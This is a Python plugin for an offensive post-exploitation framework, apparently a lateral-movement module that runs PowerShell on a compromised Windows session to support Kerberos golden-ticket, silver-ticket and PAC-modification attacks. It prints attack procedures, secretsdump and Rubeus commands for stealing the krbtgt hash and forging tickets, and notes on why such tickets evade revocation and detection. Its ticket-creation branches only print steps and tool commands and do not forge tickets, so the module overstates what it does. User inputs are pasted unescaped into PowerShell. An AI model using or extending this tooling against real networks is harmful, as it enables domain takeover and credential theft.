"""lateral_movement/ticket_manipulation — Create/modify Kerberos tickets (golden/silver). MITRE T1558"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class TicketManipulation(BasePlugin):
    NAME = "ticket_manipulation"
    DESCRIPTION = "Kerberos ticket manipulation: create golden/silver tickets, forge TGS/TGT, add SIDs"
    AUTHOR = "fitnah-team"
    MITRE = "T1558"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("ticket_type", str, required=True,
              help="golden_ticket | silver_ticket | modify_ticket"),
        Param("username", str, required=False, default="Administrator",
              help="User to impersonate in ticket"),
        Param("domain", str, required=False, default="",
              help="Domain name"),
        Param("krbtgt_hash", str, required=False, default="",
              help="krbtgt NTLM hash (for golden ticket)"),
        Param("service_key", str, required=False, default="",
              help="Service account key (for silver ticket)"),
        Param("service", str, required=False, default="",
              help="Service SPN (for silver ticket, e.g., cifs/server.domain)"),
        Param("add_groups", str, required=False, default="",
              help="Group SIDs to add to ticket (comma-separated)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute ticket manipulation"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        ticket_type = params.get("ticket_type", "").lower()

        if ticket_type == "golden_ticket":
            return self._create_golden_ticket(ctx, params)
        elif ticket_type == "silver_ticket":
            return self._create_silver_ticket(ctx, params)
        elif ticket_type == "modify_ticket":
            return self._modify_ticket(ctx, params)
        else:
            return ModuleResult.err(f"Unknown ticket type: {ticket_type}")

    @staticmethod
    def _create_golden_ticket(ctx, params) -> ModuleResult:
        """Create golden ticket (TGT with krbtgt key)"""
        username = params.get("username", "Administrator")
        domain = params.get("domain", "")
        krbtgt_hash = params.get("krbtgt_hash", "")

        ps_code = f"""
$results = @()
$results += '[*] Creating Golden Ticket (TGT)...'

try {{
    $targetUser = '{username}'
    $targetDomain = '{domain}'
    $krbtgtHash = '{krbtgt_hash}'

    if (-not $targetDomain) {{
        $targetDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    }}

    if (-not $krbtgtHash) {{
        $results += '[-] krbtgt_hash is required'
        $results += '[*] Obtain with: secretsdump.py -outputfile dump domain/user:pass@dc'
        $results += '[*] Look for: DOMAIN\\\\krbtgt: hash'
        $results -join "`n"
        exit
    }}

    $results += "[*] User: $targetUser"
    $results += "[*] Domain: $targetDomain"
    $results += "[*] krbtgt hash: $($krbtgtHash.Substring(0, 16))..."

    $results += '[*] Golden Ticket creation process:'
    $results += '    1. Build KRB_AS_REP structure'
    $results += '    2. Add username, domain, SID'
    $results += '    3. Set flags: FORWARDABLE | RENEWABLE'
    $results += '    4. Encrypt with krbtgt key'
    $results += '    5. Export as base64 (or use with Set-KerberosTicket)'

    $results += '[*] Using external tools:'
    $results += '    - Rubeus.exe golden /user:admin /domain:example.com /krbtgt:hash /outfile:ticket.kirbi'
    $results += '    - python goldenticket.py -user admin -domain example.com -aesKey hash'

    $results += '[*] Golden ticket effectiveness:'
    $results += '    ✓ Valid for 10 years (default)'
    $results += '    ✓ Survives domain reboot'
    $results += '    ✓ DC cannot revoke'
    $results += '    ✓ Impersonate ANY user'
    $results += '    ✓ Access ANY resource'

}} catch {{
    $results += "[!] Golden Ticket error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="golden_ticket_create")

    @staticmethod
    def _create_silver_ticket(ctx, params) -> ModuleResult:
        """Create silver ticket (TGS with service key)"""
        username = params.get("username", "Administrator")
        domain = params.get("domain", "")
        service = params.get("service", "cifs/server.example.com")
        service_key = params.get("service_key", "")

        ps_code = f"""
$results = @()
$results += '[*] Creating Silver Ticket (TGS)...'

try {{
    $targetUser = '{username}'
    $targetDomain = '{domain}'
    $targetService = '{service}'
    $serviceKey = '{service_key}'

    if (-not $targetDomain) {{
        $targetDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    }}

    if (-not $serviceKey) {{
        $results += '[-] service_key is required'
        $results += '[*] Obtain service key from:'
        $results += '    - secretsdump.py (service account)'
        $results += '    - Kerberos keytab file'
        $results += '    - Computer account (for CIFS/HOST services)'
        $results -join "`n"
        exit
    }}

    $results += "[*] User: $targetUser"
    $results += "[*] Domain: $targetDomain"
    $results += "[*] Service: $targetService"

    $results += '[*] Silver Ticket creation:'
    $results += '    1. Build KRB_TGS_REP structure'
    $results += '    2. Add user, domain, service SPN'
    $results += '    3. Add group memberships'
    $results += '    4. Encrypt with service key'
    $results += '    5. Valid for that service only'

    $results += '[*] Using external tools:'
    $results += '    - Rubeus.exe silver /user:admin /domain:example.com /service:cifs/server /key:hash'
    $results += '    - python silvticket.py -user admin -domain example.com -service cifs/server -key hash'

    $results += '[*] Silver ticket benefits:'
    $results += '    ✓ Impersonate user to specific service'
    $results += '    ✓ Harder to detect than golden'
    $results += '    ✓ Works for constrained access'
    $results += '    ✗ Limited to specific service SPN'

}} catch {{
    $results += "[!] Silver Ticket error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="silver_ticket_create")

    @staticmethod
    def _modify_ticket(ctx, params) -> ModuleResult:
        """Modify existing Kerberos ticket (add groups/SIDs)"""
        ps_code = """
$results = @()
$results += '[*] Modifying Kerberos ticket...'

try {
    $results += '[*] Ticket modification requires:'
    $results += '    1. Extract existing ticket from LSASS'
    $results += '    2. Decrypt using session key'
    $results += '    3. Modify SIDs/groups in PAC'
    $results += '    4. Re-encrypt with same key'
    $results += '    5. Inject back into LSASS'

    $results += '[*] PAC (Privilege Attribute Certificate) contains:'
    $results += '    - User SID'
    $results += '    - Group SIDs'
    $results += '    - Login hours'
    $results += '    - User account flags'

    $results += '[*] Modification method:'
    $results += '    1. Get ticket: Get-KerberosTicket'
    $results += '    2. Export: Export-KerberosTicket'
    $results += '    3. Modify: Parse PAC, add group SID'
    $results += '    4. Re-encrypt: Use session key'
    $results += '    5. Set-KerberosTicket'

    $results += '[!] Requires: PyKEK or C# Kerberos library'
    $results += '[!] Complex: Full ticket structure parsing needed'

} catch {
    $results += "[!] Ticket modification error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="ticket_modify")
